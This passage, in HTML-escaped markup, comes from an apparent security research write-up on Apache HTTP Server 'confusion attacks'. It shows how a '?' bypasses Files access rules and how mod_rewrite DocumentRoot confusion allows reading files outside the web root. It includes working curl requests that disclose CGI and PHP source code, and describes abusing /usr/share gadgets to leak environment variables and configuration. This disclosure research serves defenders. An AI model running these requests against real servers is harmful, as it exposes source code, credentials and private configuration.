    &lt;span class=&quot;nc&quot;&gt;Deny&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;all&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Files&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Protected &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;xmlrpc.php&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Files&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt; xmlrpc.php&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;    &lt;span class=&quot;nc&quot;&gt;Order&lt;/span&gt; Allow,Deny
    &lt;span class=&quot;nc&quot;&gt;Deny&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;all&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Files&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;CLI tools prevented from direct access:&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Files&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt; &quot;cron.php&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;    &lt;span class=&quot;nc&quot;&gt;Deny&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;all&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Files&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Through an inconsistency in how the authentication module and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_proxy&lt;/code&gt; interpret the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;filename&lt;/code&gt; field, all the above examples can be successfully bypassed with just a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;?&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;-2-documentroot-confusion&quot;&gt;🔥 2. DocumentRoot Confusion&lt;/h3&gt;

&lt;p&gt;The next attack we’re diving into is the confusion based on DocumentRoot! Let’s consider this Httpd configuration for a moment:&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;DocumentRoot&lt;/span&gt; /var/www/html
&lt;span class=&quot;nc&quot;&gt;RewriteRule&lt;/span&gt;  ^/html/(.*)$   /$1.html
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;When you visit the URL &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://server/html/about&lt;/code&gt;, which file do you think Httpd actually opens? Is it the one under the root directory, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/about.html&lt;/code&gt;, or is it from the DocumentRoot at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/www/html/about.html&lt;/code&gt;?&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240809/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The answer is — &lt;strong&gt;it accesses both paths&lt;/strong&gt;. Yep, that’s our second Confusion Attack. &lt;strong&gt;For any&lt;sup&gt;[1]&lt;/sup&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RewriteRule&lt;/code&gt;, Apache HTTP Server always tries to open both the path with DocumentRoot and without it!&lt;/strong&gt; Amazing, right? 😉&lt;/p&gt;

&lt;p&gt;&lt;em&gt;[1] Located within &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Server Config&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;VirtualHost Block&lt;/code&gt;&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;Path: &lt;a href=&quot;https://github.com/apache/httpd/blob/c3ad18b7ee32da93eabaae7b94541d3c32264340/modules/mappers/mod_rewrite.c#L4939&quot;&gt;modules/mappers/mod_rewrite.c#L4939&lt;/a&gt;&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;conf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;options&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OPTION_LEGACY_PREFIX_DOCROOT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;uri_reduced&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;apr_table_get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;notes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;mod_rewrite_uri_reduced&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prefix_stat&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pool&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uri_reduced&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;     &lt;span class=&quot;c1&quot;&gt;// &amp;lt;------ [1] access without root&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uri&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

        &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uri&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ap_core_translate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;             &lt;span class=&quot;c1&quot;&gt;// &amp;lt;------ [2] access with root&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uri&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OK&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;rewritelog&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;prefixing with document_root of %s&quot;&lt;/span&gt;
                        &lt;span class=&quot;s&quot;&gt;&quot; FAILED&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;

            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

        &lt;span class=&quot;n&quot;&gt;rewritelog&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;prefixed with document_root to %s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;rewritelog&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;go-ahead with %s [OK]&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OK&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Most of the time, the version without DocumentRoot doesn’t exist, so Apache HTTP Server goes for the version with the DocumentRoot. But this behavior already lets us “intentionally” access paths outside the Web Root. &lt;strong&gt;If today we can control the prefix of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RewriteRule&lt;/code&gt;, couldn’t we access any file on the system?&lt;/strong&gt; That’s the spirit of our second Confusion Attack! You can find numerous problematic configurations on GitHub, and even &lt;a href=&quot;https://httpd.apache.org/docs/current/rewrite/remapping.html#rewrite-query&quot;&gt;the examples from official Apache HTTP Server documentations&lt;/a&gt; are vulnerable to attacks:&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Remove mykey=???&lt;/span&gt;
&lt;span class=&quot;nc&quot;&gt;RewriteCond&lt;/span&gt; &quot;%{QUERY_STRING}&quot; &quot;(.*(?:^|&amp;amp;))mykey=([^&amp;amp;]*)&amp;amp;?(.*)&amp;amp;?$&quot;
&lt;span class=&quot;nc&quot;&gt;RewriteRule&lt;/span&gt; &quot;(.*)&quot; &quot;$1?%1%3&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;There are other &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RewriteRule&lt;/code&gt; that are also affected, such as rules based on caching needs or hiding file extensions:&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;RewriteRule&lt;/span&gt;  &quot;^/html/(.*)$&quot;  &quot;/$1.html&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The Rule trying to save bandwidth by opting for compressed versions of static files:&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;RewriteRule&lt;/span&gt;  &quot;^(.*)\.(css|js|ico|svg)&quot; &quot;$1\.$2.gz&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The rule redirecting old URLs to the main site:&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;RewriteRule&lt;/span&gt;  &quot;^/oldwebsite/(.*)$&quot;  &quot;/$1&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The rule returning a 200 OK for all CORS preflight requests:&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;RewriteCond&lt;/span&gt; %{REQUEST_METHOD} &lt;span class=&quot;ss&quot;&gt;OPTIONS&lt;/span&gt;
&lt;span class=&quot;nc&quot;&gt;RewriteRule&lt;/span&gt; ^(.*)$ $1 [R=200,L]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Theoretically, as long as the target prefix of a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RewriteRule&lt;/code&gt; is controllable, we can access nearly the entire filesystem. But from the real-world cases  above, extensions like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.html&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.gz&lt;/code&gt; are the restrictions that keep us from being truly free. So, can we access files outside &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.html&lt;/code&gt;? I am not sure if you remember the primitive of Path Truncation from the Filename Confusion earlier? By combining these two primitives, we can freely access arbitrary files on the filesystem!&lt;/p&gt;

&lt;p&gt;The following demonstrations are all based on this unsafe &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RewriteRule&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;RewriteEngine&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;On&lt;/span&gt;
&lt;span class=&quot;nc&quot;&gt;RewriteRule&lt;/span&gt;  &quot;^/html/(.*)$&quot;  &quot;/$1.html&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;️-primitive-2-1-server-side-source-code-disclosure&quot;&gt;⚔️ Primitive 2-1. Server-Side Source Code Disclosure&lt;/h4&gt;

&lt;p&gt;Let’s introduce the first primitive of DocumentRoot Confusion — &lt;strong&gt;Arbitrary Server-Side Source Code Disclosure&lt;/strong&gt;!&lt;/p&gt;

&lt;p&gt;Since Apache HTTP Server decides whether to consider a file as a Server-Side Script based on the current directory or virtual host configuration, accessing target via an absolute path can confuse Httpd’s logic, causing it to leak contents that should have been executed as code.&lt;/p&gt;

&lt;h5 id=&quot;️-2-1-1-disclose-cgi-source-code&quot;&gt;✔️ 2-1-1. Disclose CGI Source Code&lt;/h5&gt;

&lt;p&gt;Starting with the disclosure of server-side CGI source code, since &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_cgi&lt;/code&gt; binds the CGI folder to a specified URL prefix via &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ScriptAlias&lt;/code&gt;, directly accessing a CGI file using its absolute path can leak its source code due to the change of URL prefix.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl http://server/cgi-bin/download.cgi
 &lt;span class=&quot;c&quot;&gt;# the processed result from download.cgi&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl http://server/html/usr/lib/cgi-bin/download.cgi%3F
 &lt;span class=&quot;c&quot;&gt;# #!/usr/bin/perl&lt;/span&gt;
 &lt;span class=&quot;c&quot;&gt;# use CGI;&lt;/span&gt;
 &lt;span class=&quot;c&quot;&gt;# ...&lt;/span&gt;
 &lt;span class=&quot;c&quot;&gt;# # the source code of download.cgi&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h5 id=&quot;️-2-1-2-disclose-php-source-code&quot;&gt;✔️ 2-1-2. Disclose PHP Source Code&lt;/h5&gt;

&lt;p&gt;Next is the disclosure of server-side PHP source code. Given that PHP has numerous use cases, if PHP environments are applied only to specific directories or virtual hosts (which is common in web hosting), accessing PHP files from a virtual host which didn’t support PHP can disclose the source code!&lt;/p&gt;

&lt;p&gt;For example, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;www.local&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;static.local&lt;/code&gt; are two websites hosted on the same server; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;www.local&lt;/code&gt; allows PHP execution while &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;static.local&lt;/code&gt; only serves static files. Hence, you can disclose sensitive info from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;config.php&lt;/code&gt; like this:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl http://www.local/config.php
 &lt;span class=&quot;c&quot;&gt;# the processed result (empty) from config.php&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl http://www.local/var/www.local/config.php%3F &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Host: static.local&quot;&lt;/span&gt;
 &lt;span class=&quot;c&quot;&gt;# the source code of config.php&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;️-primitive-2-2-local-gadgets-manipulation&quot;&gt;⚔️ Primitive 2-2. Local Gadgets Manipulation!&lt;/h4&gt;

&lt;p&gt;Next up is our second primitive — &lt;strong&gt;Local Gadgets Manipulation&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;First, when we talked about “accessing any file on the filesystem,” did you wonder: “Hey, could an unsafe &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RewriteRule&lt;/code&gt; access &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt;?” The answer is Yes, and also no. What?&lt;/p&gt;

&lt;p&gt;Technically, the server does check if &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt; exists, but Apache HTTP Server’s built-in access control blocks our access. Here’s a snippet from Apache HTTP Server’s &lt;a href=&quot;https://github.com/apache/httpd/blob/trunk/docs/conf/httpd.conf.in#L115&quot;&gt;configuration template&lt;/a&gt;:&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Directory&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt; /&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;    &lt;span class=&quot;nc&quot;&gt;AllowOverride&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;None&lt;/span&gt;
    &lt;span class=&quot;nc&quot;&gt;Require&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;all&lt;/span&gt; denied
&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Directory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;You’ll notice it defaults to blocking access to the root directory &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/&lt;/code&gt; (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Require all denied&lt;/code&gt;). So our “arbitrary file access” ability seems a bit less “any.” Does that mean the show’s over? Not really! We have already broken the trust of only-allowed-access to the DocumentRoot, it’s a significant step forward!&lt;/p&gt;

&lt;p&gt;A closer inspection of different Httpd distributions reveals that &lt;a href=&quot;https://sources.debian.org/src/apache2/2.4.62-1/debian/config-dir/apache2.conf.in/#L165&quot;&gt;Debian/Ubuntu&lt;/a&gt; operating systems by default allow &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/share&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Directory&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt; /usr/share&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;    &lt;span class=&quot;nc&quot;&gt;AllowOverride&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;None&lt;/span&gt;
    &lt;span class=&quot;nc&quot;&gt;Require&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;all&lt;/span&gt; granted
&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Directory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;So, the next step is to “squeeze” all possibilities within this directory. All available resources, such as existing tutorials, documentation, unit test files, and even programming languages like PHP, Python, and even PHP modules could become targets for our abuse!&lt;/p&gt;

&lt;p&gt;&lt;em&gt;P.S. Of course, the exploitation here is based on the Httpd distributed by Ubuntu/Debian operating systems. However, in practice, we have also found that some applications remove the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Require all denied&lt;/code&gt; line from the root directory, allowing direct access to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt;.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240809/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h5 id=&quot;️-2-2-1-local-gadget-to-information-disclosure&quot;&gt;✔️ 2-2-1. Local Gadget to Information Disclosure&lt;/h5&gt;

&lt;p&gt;Let’s hunt for potentially exploitable files in this directory. First off, if the target Apache HTTP Server has the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;websocketd&lt;/code&gt; service installed, the default package includes an example PHP script &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dump-env.php&lt;/code&gt; under &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/share/doc/websocketd/examples/php/&lt;/code&gt;. If there’s a PHP environment on the target server, this script can be accessed directly to leak sensitive environment variables.&lt;/p&gt;

&lt;p&gt;Additionally, if the target has services like Nginx or Jetty installed, though &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/share&lt;/code&gt; is theoretically a read-only copy for package installation, these services still place their default Web Roots under &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/share&lt;/code&gt;, making it possible to leak sensitive web application information, such as the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;web.xml&lt;/code&gt; in Jetty.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;/usr/share/nginx/html/&lt;/li&gt;
  &lt;li&gt;/usr/share/jetty9/etc/&lt;/li&gt;
  &lt;li&gt;/usr/share/jetty9/webapps/&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Here’s a simple demonstration using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;setup.php&lt;/code&gt; from the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Davical&lt;/code&gt; package, which exists as a read-only copy, to leak contents of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;phpinfo()&lt;/code&gt;.&lt;/p&gt;

